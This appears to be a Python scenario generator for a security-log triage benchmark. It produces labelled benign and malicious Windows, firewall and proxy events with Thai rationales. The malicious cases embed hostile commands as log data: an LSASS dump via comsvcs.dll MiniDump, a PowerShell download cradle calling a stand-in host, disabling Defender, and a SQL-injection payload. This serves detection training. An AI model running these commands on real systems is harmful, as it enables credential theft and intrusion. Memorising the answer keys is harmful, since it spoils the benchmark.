# -*- coding: utf-8 -*-
"""Scenario content v4: neutral prompts, corrected labels, IoC-in-log,
independent incidents (no hidden cross-case chains), label-blind timing
(see Build.map_time / generator schedule), high-alert FP traps and low-alert
true positives. Rationales in Thai."""
import base64
import datetime
from . import assets as A
from . import evbuilders as EV
from . import timeutil as T

# Neutral prompts: identical wording regardless of the true label/stage.
PROMPTS = {
    "triage_severity":
        "วิเคราะห์เหตุการณ์จากบันทึก (log) ที่อ้างถึง แล้วระบุ: (1) ระดับความรุนแรง "
        "(critical/high/medium/low/info) (2) เป็นกิจกรรมที่เป็นอันตราย (malicious) หรือไม่ "
        "(3) เหตุผลประกอบ",
    "ioc_extraction":
        "สกัดตัวบ่งชี้การบุกรุก (IoC) ทั้งหมดที่ปรากฏในบันทึกที่อ้างถึง (IP, โดเมน, แฮช, URL, "
        "ชื่อไฟล์, registry ฯลฯ) พร้อมระบุระดับความรุนแรงและว่าเป็นอันตรายหรือไม่",
    "attack_mapping":
        "แมปกิจกรรมในบันทึกที่อ้างถึงเข้ากับเทคนิค MITRE ATT&CK ระดับ sub-technique "
        "พร้อมระบุระดับความรุนแรงและว่าเป็นอันตรายหรือไม่",
    "correlation":
        "บันทึกที่อ้างถึงมาจากหลายแหล่ง วิเคราะห์ว่าเกี่ยวข้องกับเหตุการณ์เดียวกันหรือไม่ "
        "ถ้าใช่ให้ระบุคีย์ที่ใช้เชื่อมโยง (correlation keys) พร้อมประเมินความรุนแรงและว่าเป็นอันตรายหรือไม่",
    "campaign_reconstruction":
        "วิเคราะห์ว่าบันทึกที่อ้างถึงเป็นส่วนหนึ่งของแคมเปญโจมตีหลายขั้นหรือไม่ ถ้าใช่ให้ระบุ "
        "campaign_id และหมายเลขขั้น (stage) พร้อมแมป ATT&CK และประเมินความรุนแรง",
}

CMD = r"C:\Windows\System32\cmd.exe"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
LSASS = r"C:\Windows\System32\lsass.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
W3WP = r"C:\Windows\System32\inetsrv\w3wp.exe"
EXPL = r"C:\Windows\explorer.exe"
CCMEXEC = r"C:\Windows\CCM\CcmExec.exe"
ADM = "adm_kitti"          # fictional IT administrator


def enc_ps(cmd):
    """PowerShell -EncodedCommand payload: base64 of the UTF-16LE command.
    The command itself is defanged (hxxps://, [.]) so it is inert."""
    return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")


def defang(dom):
    return dom.replace(".", "[.]")


def dt(b, y, mo, d, h, mi, s=None, ms=None):
    """Scenario-authored local time -> scheduled UTC instant (Build.map_time
    re-anchors the whole case/group to a label-blind slot)."""
    s = b.rng.randint(1, 58) if s is None else s
    ms = b.rng.randint(1, 998) if ms is None else ms
    loc = datetime.datetime(y, mo, d, h, mi, s, ms * 1000, tzinfo=T.ORG_TZ)
    return b.map_time(loc.astimezone(T.UTC))


def P(tt):
    return PROMPTS[tt]


def ioc(k, v):
    return {"type": k, "value": v}


def home(u):
    return A.HOME[u]


# ======================================================================
# BENIGN CASES (realistic traps + balanced benign triage)
# ======================================================================

def benign_cases(b):
    e = b.ent

    # T1: admin PsExec patching (+ Defender HIGH "remote admin tool" alert ->
    #     high-alert FP trap; ticketed change in environment.json)
    b.hint("biz", who=[ADM])
    d = dt(b, 2026, 11, 10, 9, 12)
    r1, lid = EV.sec_4624(b, d, "SRV-FILE01", ADM, 3,
                          A.ip("JUMP01"), "JUMP01", auth="Kerberos")
    r2 = EV.sys_7045(b, d, "SRV-FILE01", "PSEXESVC",
                     r"C:\Windows\PSEXESVC.exe", installer=ADM)
    r3 = b.add_app_event(
        "SRV-FILE01", 1116, d, "Microsoft-Windows-Windows Defender",
        "Microsoft Defender Antivirus has detected potentially unwanted software. "
        "Name: HackTool:Win32/RemAdmin.gen Severity: High Category: Tool "
        r"Path: file:_C:\Windows\PSEXESVC.exe Detection Origin: Local machine "
        "Action: Allowed (admin exclusion policy JUMP-ADMIN-TOOLS) User: CORP\\" + ADM,
        level=3)
    r4 = EV.sec_4688(b, d, "SRV-FILE01", "SYSTEM", CMD,
                     "cmd /c wusa C:\\Windows\\Temp\\windows10.0-kb5039xxx.msu /quiet /norestart",
                     r"C:\Windows\PSEXESVC.exe", actor_domain="NT AUTHORITY")
    b.add_change("CHG-2611-1042", d - datetime.timedelta(minutes=20),
                 d + datetime.timedelta(hours=2), ["SRV-FILE01"],
                 f"ติดตั้งแพตช์ KB5039xxx บน SRV-FILE01 ผ่าน PsExec จาก JUMP01 โดย {ADM}")
    b.add_case("triage_severity", P("triage_severity"), [r1, r2, r3, r4],
               "info", False, [], [],
               f"PSEXESVC + ล็อกออน type3 จาก JUMP01 โดย {ADM} (แอดมิน IT) แล้วรัน wusa ติดตั้งแพตช์ ตรงกับ change CHG-2611-1042 ใน environment.json แม้ Defender แจ้ง HackTool ระดับ High แต่เป็นเครื่องมือแอดมินที่อยู่ใน exclusion policy = งานดูแลระบบปกติ (alert ระดับสูงแต่ไม่ใช่การโจมตี)",
               is_fp_trap=True, fp_trap_kind="admin_psexec_patching_high_alert")

    # T2: SCCM deploy PowerShell (real script, parent CcmExec, svc_sccm)
    b.hint("night", who=["svc_sccm"])
    d = dt(b, 2026, 11, 10, 2, 30)
    script = ("$pkg='CM00123'; Start-CMPackageDeployment -Id $pkg; "
              "Write-Output 'applying baseline'; Set-Location $env:windir\\CCM")
    r1 = EV.ps_4104(b, d, "WKS-HR-03", "svc_sccm", script, level=5,
                    path=r"C:\Windows\CCM\SystemTemp\deploy-CM00123.ps1")
    r2 = EV.sec_4688(b, d, "WKS-HR-03", "svc_sccm", PS,
                     "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\deploy-CM00123.ps1",
                     CCMEXEC, parent_tag="boot")
    b.add_case("triage_severity", P("triage_severity"), [r1, r2],
               "info", False, [], [],
               "PowerShell ถูกเรียกโดย CcmExec.exe (SCCM) ด้วยบัญชี svc_sccm รันสคริปต์ deploy baseline ปกติ — เป็น software deployment ของระบบ ไม่ใช่สคริปต์ obfuscate",
               is_fp_trap=True, fp_trap_kind="sccm_deploy_powershell")

    # T3: EDR LSASS access (GrantedAccess 0x1400)
    b.hint("any")
    d = dt(b, 2026, 11, 10, 11, 5)
    r = EV.sm10(b, d, "WKS-FIN-07",
                r"C:\Program Files\Windows Defender\MsMpEng.exe", LSASS,
                "0x1400", "SYSTEM", legit=True, tag="boot")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "low", False, [], [],
               "การเข้าถึง lsass โดย MsMpEng.exe (Microsoft Defender, รันเป็น SYSTEM) ด้วย GrantedAccess 0x1400 เป็นการสแกนปกติของ AV ไม่ใช่การดัมพ์ credential",
               is_fp_trap=True, fp_trap_kind="edr_lsass_access")

    # T4: backup agent LSASS access (0x1000)
    b.hint("night", who=["svc_backup"])
    d = dt(b, 2026, 11, 10, 1, 15)
    r = EV.sm10(b, d, "SRV-SQL01",
                r"C:\Program Files\Veeam\Backup\VeeamAgent.exe", LSASS,
                "0x1000", "svc_backup", legit=True, tag="boot")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "low", False, [], [],
               "VeeamAgent (backup) เปิด handle lsass ด้วย 0x1000 (QUERY_LIMITED) ระหว่างงานสำรองข้อมูลกลางคืน — ปกติ ไม่ใช่การดัมพ์ (แสดงว่า GrantedAccess อย่างเดียวไม่พอชี้ขาด)",
               is_fp_trap=True, fp_trap_kind="backup_lsass_access")

    # T5: authorized vuln scan -> PA-CORE THREAT *critical* + denies
    #     (high-alert FP trap; window documented in environment.json)
    scanner = "VULNSCAN01"
    b.hint("night", who=["scan_svc"])
    d0 = dt(b, 2026, 11, 11, 1, 0)
    refs = []
    tgts = ["SRV-SQL01", "SRV-FILE01", "SRV-APP01"]
    for i in range(7):
        dd = dt(b, 2026, 11, 11, 1, 5 + i // 3, s=(i * 7 + 2) % 59)
        refs.append(EV.pan_traffic(b, dd, "PA-CORE", "deny",
                    scanner, A.ip(tgts[i % 3]), "incomplete", "deny",
                    [445, 3389, 1433, 22, 139][i % 5], outbound=False,
                    end_reason="policy-deny"))
    for i, (tn, sev) in enumerate([("SMB Remote Code Execution Attempt", "critical"),
                                   ("MS-SQL Authentication Bypass Attempt", "critical"),
                                   ("RDP Pre-Auth Overflow Attempt", "high")]):
        dd = dt(b, 2026, 11, 11, 1, 9 + i, s=11 + i * 9)
        refs.append(EV.pan_threat(b, dd, "PA-CORE", "vulnerability",
                    A.ip(scanner), tgts[i], ["ms-ds-smb", "mssql-db", "ms-rdp"][i],
                    "alert", "", tn, 0, "code-execution", sev, 0,
                    suser="corp\\scan_svc", inbound=False,
                    dport=[445, 1433, 3389][i]))
    b.add_change("CHG-2611-0815", d0 - datetime.timedelta(minutes=5),
                 d0 + datetime.timedelta(hours=3), [scanner] + tgts,
                 "หน้าต่างสแกนช่องโหว่ประจำเดือนจาก VULNSCAN01 (บัญชี scan_svc) ไปยังเซิร์ฟเวอร์ภายใน อนุมัติโดย secops",
                 kind="scan_window")
    b.add_case("triage_severity", P("triage_severity"), refs,
               "low", False, [], [ioc("ip", A.ip(scanner))],
               "การสแกนพอร์ตและ IPS signature ระดับ critical จาก VULNSCAN01 (subnet บริหารจัดการ, บัญชี scan_svc) ตรงกับหน้าต่างสแกนที่อนุมัติ CHG-2611-0815 ใน environment.json — alert แรงแต่เป็นการสแกนช่องโหว่ที่ชอบด้วยกฎ จัด low เพื่อติดตาม ไม่ใช่การโจมตี",
               is_fp_trap=True, fp_trap_kind="authorized_vuln_scan_critical_ips")

    # T6: high-entropy CDN DNS (benign)
    b.hint("biz", who=["nwong"])
    d = dt(b, 2026, 11, 10, 13, 40)
    cdn = f"{e._hex(10)}.cdn-assets.example"
    cdnip = A.alloc_ext("legit_edge.cdn-assets.example", noise=True)
    r1 = EV.sm22(b, d, "WKS-SALES-22",
                 r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                 cdn, f"type: 5 edge.cdn-assets.example;::ffff:{cdnip}",
                 "nwong", tag="nwong-chrome")
    r2 = EV.bind_q(b, d, "WKS-SALES-22", cdn, "A")
    b.add_case("ioc_extraction", P("ioc_extraction"), [r1, r2],
               "low", False, [], [ioc("domain", cdn)],
               "subdomain เอนโทรปีสูงดูคล้าย DGA แต่ parent domain เป็น cdn-assets.example (CDN) เรียกจาก chrome.exe และ resolve เป็น CNAME ของ edge CDN ที่เห็นใน traffic ปกติ — ไม่เป็นอันตราย",
               is_fp_trap=True, fp_trap_kind="high_entropy_cdn")

    # T7: developer kubectl exec (authenticated, allowed)
    b.hint("biz", who=["ddeep"])
    d = dt(b, 2026, 11, 10, 15, 20)
    r = EV.k8s(b, d, "ddeep", ["system:authenticated", "dev-team"],
               A.ip("WKS-DEV-11"), "create", "pods", "exec", "dev",
               "payments-api-7c9d", 101, "kubectl/v1.29.0",
               decision="allow", reason="RBAC: allowed by RoleBinding dev-team-edit")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "low", False, [], [],
               "kubectl exec เข้า pod ใน namespace dev โดย ddeep (dev-team) ได้รับอนุญาตตาม RoleBinding ในเวลางาน = การดีบักปกติของนักพัฒนา",
               is_fp_trap=True, fp_trap_kind="developer_kubectl_exec")

    # T8: SCCM scheduled task (correct path)
    b.hint("any", who=["svc_sccm"])
    d = dt(b, 2026, 11, 10, 3, 5)
    r = EV.sec_4698(b, d, "WKS-HR-03",
                    "\\Microsoft\\Configuration Manager\\Hardware Inventory Collection Cycle",
                    "svc_sccm", CCMEXEC, "/inventory:hardware")
    b.add_case("attack_mapping", P("attack_mapping"), [r],
               "low", False, [], [],
               "Scheduled task สร้างโดย svc_sccm ภายใต้ \\Microsoft\\Configuration Manager\\ ชี้ CcmExec.exe = งาน inventory ของ SCCM ปกติ ไม่ใช่ persistence ของผู้โจมตี",
               is_fp_trap=True, fp_trap_kind="sccm_scheduled_task")

    # T9: onboarding account create (helpdesk) -- pwadee has NO activity
    #     before this 4720 (noise for pwadee is generated only afterwards)
    b.hint("biz", who=["pwadee", "helpdesk"])
    d = dt(b, 2026, 11, 11, 9, 30)
    r1 = EV.sec_4720(b, d, "SRV-DC01", "pwadee", "helpdesk")
    r2 = EV.sec_4728(b, d + datetime.timedelta(seconds=4), "SRV-DC01",
                     EV.new_acct_sid("pwadee"), 513, "Domain Users", "helpdesk")
    b.created_accounts["pwadee"] = d
    b.add_case("triage_severity", P("triage_severity"), [r1, r2],
               "low", False, [], [],
               "บัญชี helpdesk สร้างบัญชีโดเมน pwadee แล้วเพิ่มเข้า Domain Users (กลุ่มมาตรฐาน) ในเวลางาน และ pwadee อยู่ใน inventory ของ environment.json (พนักงานใหม่ hire_date ตรงวัน) ไม่มี activity ของ pwadee ก่อนการสร้าง = onboarding ปกติ จัด low เพื่อติดตาม",
               is_fp_trap=True, fp_trap_kind="onboarding_account")

    # T10: admin RDP from JUMP01 (type 10 User32/Negotiate)
    b.hint("biz", who=[ADM])
    d = dt(b, 2026, 11, 10, 10, 2)
    r1, lid = EV.sec_4624(b, d, "SRV-SQL01", ADM, 10,
                          A.ip("JUMP01"), "JUMP01", auth="Negotiate")
    r2 = EV.fgt(b, d, "FGT-CORE", "traffic", "forward", "notice", "JUMP01",
                A.ip("SRV-SQL01"), 3389, "accept", "RDP", "RDP",
                "Remote.Access", outbound=False, dstcountry="Reserved")
    b.add_case("triage_severity", P("triage_severity"), [r1, r2],
               "info", False, [], [],
               f"RDP (type 10, User32/Negotiate) เข้า SRV-SQL01 จาก JUMP01 โดย {ADM} = เส้นทางดูแลระบบมาตรฐานผ่าน jump host",
               is_fp_trap=True, fp_trap_kind="admin_rdp_jump")

    # T11: MSI install benign
    b.hint("biz")
    d = dt(b, 2026, 11, 10, 14, 10)
    r = b.add_app_event("WKS-HR-03", 11707, d, "MsiInstaller",
                        "Product: 7-Zip 24.08 (x64) -- Installation completed successfully.")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "info", False, [], [],
               "MsiInstaller 11707 การติดตั้ง 7-Zip สำเร็จ = เหตุการณ์ปกติ",
               is_fp_trap=False)

    # ---- v4 high-alert FP traps (vendor alert high/critical, benign) ----
    # HT2: EICAR AV validation by helpdesk -> FortiGate AV crlevel critical
    b.hint("biz", who=["helpdesk"])
    d = dt(b, 2026, 11, 10, 10, 40)
    tdom = "av-test-files.example"
    tip = A.alloc_ext("eicar_site")
    r1 = EV.fgt(b, d, "FGT-EDGE", "utm", "virus", "warning", home("helpdesk"),
                tip, 443, "blocked", "HTTPS", "HTTPS.BROWSER", "Web.Client",
                logid="0211008192",
                extra=f'virus="EICAR_TEST_FILE" dtype="Virus" ref="FGT-EICAR" '
                      f'virusid=2172 url="https://{tdom}/eicar.com.txt" '
                      f'filename="eicar.com.txt" crlevel="critical" '
                      f'user="helpdesk" profile="default"')
    r2 = EV.squid(b, d, home("helpdesk"), "CONNECT", f"{tdom}:443", "helpdesk",
                  5120, tip)
    b.add_change("SR-2611-0310", d - datetime.timedelta(minutes=10),
                 d + datetime.timedelta(minutes=50), [home("helpdesk")],
                 "helpdesk ทดสอบการทำงานของ AV/UTM ด้วยไฟล์ทดสอบมาตรฐาน EICAR ตามคำขอ SR-2611-0310",
                 kind="service_request")
    b.add_case("triage_severity", P("triage_severity"), [r1, r2],
               "info", False, [], [],
               "FortiGate AV บล็อก EICAR_TEST_FILE (crlevel critical) จากเครื่อง helpdesk ตรงกับ service request SR-2611-0310 ใน environment.json = ไฟล์ทดสอบ AV มาตรฐาน ไม่ใช่มัลแวร์ (alert critical แต่ benign)",
               is_fp_trap=True, fp_trap_kind="eicar_av_test")

    # HT4: monitoring probe with rotated password -> Check Point IPS "High"
    b.hint("any", who=["svc_monitor"])
    d = dt(b, 2026, 11, 10, 16, 0)
    refs = []
    for i in range(4):
        dd = d + datetime.timedelta(seconds=60 * i + b.rng.randint(0, 9))
        refs.append(EV.sec_4625(b, dd, "SRV-SQL01", "svc_monitor", 3,
                    A.ip("SRV-MON01"), "SRV-MON01", user_exists=True,
                    auth="NTLM", substatus="0xc0000071"))
    refs.append(EV.cp(b, d + datetime.timedelta(seconds=200), "IPS", "Detect",
                      A.ip("SRV-MON01"), A.ip("SRV-SQL01"), 1433,
                      rule="Internal-SQL", severity="High",
                      extra_pairs=[("cs2Label", "Protection Name"),
                                   ("cs2", "Microsoft SQL Server Brute Force Login Attempt"),
                                   ("cs3Label", "Protection Type"), ("cs3", "IPS")]))
    b.add_change("CHG-2611-0977", d - datetime.timedelta(hours=1),
                 d + datetime.timedelta(minutes=30), ["SRV-MON01", "SRV-SQL01"],
                 "หมุนรหัสผ่านบัญชีบริการ svc_monitor (password rotation) — probe ตรวจสุขภาพ SQL ต้องอัปเดต credential หลังเปลี่ยน")
    b.add_case("triage_severity", P("triage_severity"), refs,
               "low", False, [], [],
               "4625 ของ svc_monitor จาก SRV-MON01 ด้วย SubStatus 0xc0000071 (รหัสผ่านหมดอายุ) ทุก ~1 นาทีตามรอบ health probe ทำให้ Check Point IPS ขึ้น SQL brute force ระดับ High แต่ตรงกับ change หมุนรหัสผ่าน CHG-2611-0977 = probe ที่ใช้รหัสเก่า ไม่ใช่การเดารหัส (low เพื่อให้แก้ config)",
               is_fp_trap=True, fp_trap_kind="monitoring_probe_ips_high")

    # (v4) v3's orphan background events here were removed: noise.py owns
    # all unreferenced background activity.


# ======================================================================
# MALICIOUS STANDALONE CASES -- each on an independent user/host pair
# ======================================================================

def malicious_cases(b):
    e = b.ent

    # M1 RDP brute-force success -> HIGH. NLA: failures are type 3 (NtLmSsp),
    #    the successful interactive session is type 10.
    atk = A.alloc_ext("rdp_brute")
    refs = []
    b.hint("any", who=["administrator@SRV-RDS01", "SRV-RDS01"])
    d0 = dt(b, 2026, 11, 11, 3, 10)
    for i in range(6):
        dd = dt(b, 2026, 11, 11, 3, 10, s=12 + i * 4 + b.rng.randint(0, 3))
        # v4.2: every NLA attempt is its own TCP session through FGT-EDGE
        # (DNAT 203.0.113.5 -> SRV-RDS01) and PA-DMZ; IpPort = firewall sport
        sp = EV.rdp_inbound(b, dd, atk, "SRV-RDS01", ok=False)
        refs.append(EV.sec_4625(b, dd, "SRV-RDS01", "administrator", 3,
                                atk, "-", user_exists=True, ip_port=sp))
    dok = dt(b, 2026, 11, 11, 3, 11, s=30)
    sp = EV.rdp_inbound(b, dok, atk, "SRV-RDS01", ok=True,
                        session_s=b.rng.randint(1500, 3000))
    r_ok, lid = EV.sec_4624(b, dok, "SRV-RDS01", "administrator", 10, atk, "-",
                            auth="Negotiate", ip_port=sp)
    refs.append(r_ok)
    b.add_case("triage_severity", P("triage_severity"), refs,
               "high", True, ["T1110.001"], [ioc("ip", atk)],
               "ล็อกออนล้มเหลว (type 3/NLA) หลายครั้งต่อบัญชี administrator จาก IP ภายนอกเดียวกันในเวลาไม่ถึงนาที แล้ว RDP (type 10) สำเร็จ = Password Guessing สำเร็จบนโฮสต์ DMZ ปรับเป็น high เพราะเข้าถึงได้จริง")

    # M2 LSASS credential dump -> CRITICAL (tnuch; PID = real lsass)
    b.hint("biz", who=["tnuch"])
    h = home("tnuch")
    d = dt(b, 2026, 11, 11, 14, 22)
    dumpfile = r"C:\Windows\Temp\proc_01.dmp"
    lp = b.lsass_pid(h)
    r0 = EV.sm1(b, d, h, CMD, "cmd.exe", "tnuch", EXPL,
                r"C:\Windows\Explorer.EXE", integrity="High")
    r1 = EV.sm1(b, d + datetime.timedelta(milliseconds=3310), h, r"C:\Windows\System32\rundll32.exe",
                f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {lp} {dumpfile} full',
                "tnuch", CMD, "cmd.exe", integrity="High",
                company="Microsoft Corporation", parent_tag="g%d" % b._gid)
    r2 = EV.sm10(b, d + datetime.timedelta(milliseconds=4720), h, r"C:\Windows\System32\rundll32.exe", LSASS,
                 "0x1fffff", "tnuch")
    r3 = EV.sm11(b, d + datetime.timedelta(milliseconds=6540), h, r"C:\Windows\System32\rundll32.exe",
                 dumpfile, "tnuch")
    b.add_case("attack_mapping", P("attack_mapping"), [r1, r2, r3],
               "critical", True, ["T1003.001"],
               [ioc("file", dumpfile)],
               f"rundll32 เรียก comsvcs.dll MiniDump กับ PID {lp} (= PID ของ lsass บนเครื่องนี้) เปิด handle lsass ด้วยสิทธิ์เต็ม (0x1fffff) แล้วเขียนไฟล์ dump = LSASS Memory credential dumping")

    # M3 IIS web shell -> HIGH
    b.hint("any", who=["svc_web@SRV-WEB02", "SRV-WEB02"])
    d = dt(b, 2026, 11, 11, 10, 40)
    shell = r"C:\inetpub\wwwroot\uploads\diag.aspx"
    # v4.2: the upload arrives from the internet through FGT-EDGE (VIP
    # 203.0.113.4) -> PA-DMZ -> F5 vs_partner_https; then the shell is called
    ws_src = A.alloc_ext("webshell_web02")
    dup = d - datetime.timedelta(milliseconds=1870)
    EV.web_inbound(b, dup - datetime.timedelta(milliseconds=420), ws_src, "SRV-WEB02",
                   bsent=b.rng.randint(9000, 16000), brecv=b.rng.randint(600, 1400))
    r0 = EV.f5(b, dup, [("policy_name", "partner_portal_asm"),
                        ("violations", "N/A"), ("request_status", "passed"),
                        ("ip_client", ws_src), ("method", "POST"),
                        ("uri", "/uploads/upload.aspx?f=diag.aspx"),
                        ("response_code", "200"), ("severity", "Informational")],
               host="SRV-WEB02")
    r2 = EV.sm11(b, d, "SRV-WEB02", W3WP, shell, "svc_web", tag="iis")
    r1 = EV.sm1(b, dt(b, 2026, 11, 11, 10, 43), "SRV-WEB02", CMD,
                "cmd /c whoami & ipconfig /all", "svc_web", W3WP,
                'c:\\windows\\system32\\inetsrv\\w3wp.exe -ap "DefaultAppPool"',
                integrity="High", company="", parent_tag="iis")
    EV.web_inbound(b, d + datetime.timedelta(seconds=150), ws_src, "SRV-WEB02",
                   bsent=b.rng.randint(700, 1500), brecv=b.rng.randint(2000, 6000))
    EV.f5(b, d + datetime.timedelta(seconds=151), [
        ("policy_name", "partner_portal_asm"), ("violations", "N/A"),
        ("request_status", "passed"), ("ip_client", ws_src), ("method", "POST"),
        ("uri", "/uploads/diag.aspx"), ("response_code", "200"),
        ("severity", "Informational")], host="SRV-WEB02")
    b.add_case("attack_mapping", P("attack_mapping"), [r0, r2, r1],
               "high", True, ["T1505.003"],
               [ioc("file", shell), ioc("ip", ws_src)],
               "F5 (vs_partner_https) ผ่านคำขอ POST อัปโหลด diag.aspx จาก IP ภายนอก แล้ว w3wp.exe (IIS) เขียนไฟล์ .aspx ลง wwwroot และ w3wp ตัวเดียวกัน (ProcessGuid เดียวกัน) spawn cmd รัน whoami/ipconfig = Web Shell บนเซิร์ฟเวอร์ IIS (SRV-WEB02)")

    # M5 service install after NTLM network logon -> HIGH (svc_deploy from cdao's host)
    b.hint("any", who=["svc_deploy", "cdao"])
    d = dt(b, 2026, 11, 11, 15, 2)
    src = home("cdao")
    r1, lid = EV.sec_4624(b, d, "SRV-APP01", "svc_deploy", 3, A.ip(src),
                          src, auth="NTLM")
    svcbin = r"C:\Windows\Temp\msupdate77.exe"
    r2 = EV.sys_7045(b, d, "SRV-APP01", "msupdate77", svcbin,
                     installer="svc_deploy")
    b.add_case("triage_severity", P("triage_severity"), [r1, r2],
               "high", True, ["T1543.003", "T1021.002"], [ioc("file", svcbin)],
               f"ล็อกออน network ด้วย NTLM ของ svc_deploy จากเวิร์กสเตชันผู้ใช้ ({src}) แล้วบัญชีเดียวกัน (UserID ใน 7045) ติดตั้งบริการชื่อสุ่มชี้ไฟล์ใน Temp = การเคลื่อนที่ด้านข้างแล้วติดตั้ง service persistence ปรับ high")

    # M6 WMI event consumer persistence -> HIGH
    b.hint("any")
    d = dt(b, 2026, 11, 11, 16, 10)
    r = EV.wmi_5861(b, d, "SRV-FILE01", "wupdater",
                    "__InstanceModificationEvent within 60",
                    "__InstanceModificationEvent WITHIN 60 WHERE "
                    "TargetInstance ISA 'Win32_PerfFormattedData'")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "high", True, ["T1546.003"], [],
               "สร้าง WMI permanent event subscription (CommandLineEventConsumer ชื่อ wupdater ที่ไม่ใช่ consumer มาตรฐาน) = WMI Event Subscription persistence ปรับ high เพราะเป็นกลไกคงอยู่ที่ตรวจยาก")

    # M7 clear Security event log -> HIGH, revoked T1070.001 -> T1685.005
    b.hint("any", who=["administrator@SRV-DC01", "SRV-DC01"])
    d = dt(b, 2026, 11, 11, 23, 50)
    r = EV.sec_1102(b, d, "SRV-DC01", "administrator")
    b.add_case("triage_severity", P("triage_severity"), [r],
               "high", True, ["T1685.005"], [],
               "เหตุการณ์ 1102 ล้าง Security log บน DC โดยบัญชี administrator ที่ไม่มี change รองรับ = Clear Windows Event Logs (ID ปัจจุบัน T1685.005 หลัง T1070.001 ถูก revoke) ปรับ high")

    # M8 impair defenses -> MEDIUM, revoked T1562.001 -> T1685 (nporn)
    b.hint("biz", who=["nporn"])
    h = home("nporn")
    d = dt(b, 2026, 11, 11, 14, 5)
    r = EV.sec_4688(b, d, h, "nporn", PS,
                    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                    CMD)
    b.add_case("triage_severity", P("triage_severity"), [r],
               "medium", True, ["T1685"], [],
               "ปิด real-time protection ของ Defender ผ่าน PowerShell = Impair Defenses (ID ปัจจุบัน T1685 หลัง T1562.001 ถูก revoke)")

    # M10 Domain Admins discovery -> MEDIUM (sboon)
    b.hint("biz", who=["sboon"])
    h = home("sboon")
    d = dt(b, 2026, 11, 11, 13, 20)
    r1 = EV.sec_4688(b, d, h, "sboon", r"C:\Windows\System32\net.exe",
                     'net group "Domain Admins" /domain', CMD)
    r2 = EV.sec_4688(b, dt(b, 2026, 11, 11, 13, 21), h, "sboon",
                     r"C:\Windows\System32\net.exe",
                     "net user administrator /domain", CMD)
    b.add_case("triage_severity", P("triage_severity"), [r1, r2],
               "medium", True, ["T1069.002", "T1087.002"], [],
               "net group \"Domain Admins\" /domain + net user administrator /domain จากเครื่องผู้ใช้ทั่วไป = Permission Groups Discovery: Domain Groups (T1069.002) ร่วมกับ Account Discovery: Domain Account")

    # M11 priv account creation + add to Domain Admins -> HIGH (helpdesk acct abused)
    b.hint("any", who=["helpdesk", "svc_helpdesk2", "SRV-DC01"])
    d = dt(b, 2026, 11, 11, 17, 40)
    r1 = EV.sec_4720(b, d, "SRV-DC01", "svc_helpdesk2", "helpdesk")
    r2 = EV.sec_4728(b, dt(b, 2026, 11, 11, 17, 41), "SRV-DC01",
                     EV.new_acct_sid("svc_helpdesk2"), 512, "Domain Admins", "helpdesk")
    b.add_case("attack_mapping", P("attack_mapping"), [r1, r2],
               "high", True, ["T1136.002", "T1098.007"], [],
               "บัญชี helpdesk (ไม่ใช่ Domain Admin และไม่มี change/onboarding รองรับ) สร้างบัญชีโดเมนใหม่ svc_helpdesk2 แล้วเพิ่มเข้า Domain Admins (4728, RID 512) ทันที = Create Account: Domain Account (T1136.002) + Additional Local or Domain Groups (T1098.007)")

    # M12 exfil to external cloud share -> HIGH (mwhite)
    b.hint("biz", who=["mwhite"])
    h = home("mwhite")
    d = dt(b, 2026, 11, 11, 18, 15)
    pdom = f"share-{e._hex(4)}.cloud-share.example"
    pip = A.alloc_ext("exfil")
    r2 = EV.bind_q(b, d, h, pdom, "A")
    r1 = EV.squid(b, d, h, "POST", f"https://{pdom}/upload",
                  "mwhite", 4096, pip, content_type="application/json",
                  result="TCP_MISS/200")
    b.add_case("ioc_extraction", P("ioc_extraction"), [r1, r2],
               "high", True, ["T1567.002"],
               [ioc("domain", pdom), ioc("ip", pip)],
               "อัปโหลดข้อมูลผ่าน proxy ไปโดเมน cloud-share ภายนอกที่ไม่อยู่ในรายการที่องค์กรใช้ (resolve ครั้งแรกก่อน POST) = Exfiltration to Cloud Storage")

    # M13 SQLi blocked by F5 (single layer attempt) -> MEDIUM
    b.hint("any")
    d = dt(b, 2026, 11, 11, 11, 25)
    aip = A.alloc_ext("sqli")
    EV.web_inbound(b, d - datetime.timedelta(milliseconds=380), aip, "SRV-WEB01")
    r = EV.f5(b, d, [("policy_name", "prod_web_asm"),
                     ("violations", "Attack signature detected"),
                     ("sig_names", "SQL-Injection (parameter)"),
                     ("request_status", "blocked"),
                     ("ip_client", aip), ("method", "GET"),
                     ("uri", "/product?id=1%20OR%201%3D1--"),
                     ("response_code", "403"), ("severity", "Error")])
    b.add_case("triage_severity", P("triage_severity"), [r],
               "medium", True, ["T1190"], [ioc("ip", aip)],
               "F5 ASM บล็อก SQL injection ที่พารามิเตอร์ id จาก IP ที่ไม่อยู่ในรายการ pentest = Exploit Public-Facing Application (พยายาม) ถูกบล็อกชั้นเดียวจึง medium")

    # M14 PowerShell download cradle -> HIGH (kchai)
    b.hint("biz", who=["kchai"])
    h = home("kchai")
    d = dt(b, 2026, 11, 11, 9, 50)
    ddom = f"pkg-{e._hex(4)}.pkg-mirror.example"
    dip = A.alloc_ext("cradle")
    r1 = EV.ps_4104(b, d, h, "kchai",
                    f"IEX (New-Object Net.WebClient).DownloadString('https://{ddom}/a')",
                    level=3, path=r"C:\Users\kchai\AppData\Local\Temp\s.ps1")
    r2 = EV.bind_q(b, d, h, ddom, "A")
    r3 = EV.sm3(b, d, h, PS, "kchai", A.ip(h),
                b.rng.randint(49152, 65535), dip, 443, dst_host=ddom)
    b.add_case("ioc_extraction", P("ioc_extraction"), [r1, r2, r3],
               "high", True, ["T1059.001", "T1105"],
               [ioc("domain", ddom), ioc("ip", dip)],
               "PowerShell ScriptBlock ใช้ DownloadString ดึงสคริปต์จากโดเมนภายนอก แล้วเชื่อมต่อ 443 = Command and Scripting Interpreter + Ingress Tool Transfer")

